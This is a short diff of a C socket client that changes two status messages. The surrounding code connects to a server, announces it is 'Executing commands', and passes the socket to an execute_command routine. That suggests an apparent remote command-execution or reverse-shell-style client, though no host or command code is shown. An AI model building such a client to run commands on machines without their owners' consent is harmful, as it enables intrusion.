@@ -61,7 +61,7 @@ int main() {
 #endif
     sock = socket(AF_INET, SOCK_STREAM, 0);
     if (sock < 0) {
-        perror("Client: Socket creation failed");
+        perror("Failed Socket Creation");
         exit(1);
     }
     server_addr.sin_family = AF_INET;
@@ -73,7 +73,7 @@ int main() {
         exit(1);
     }
 
-    printf("Connected to the server. Executing commands...\n");
+    printf("Connected to the server - Executing commands\n");
     execute_command(sock);
     while (1) {
         sleep(1);
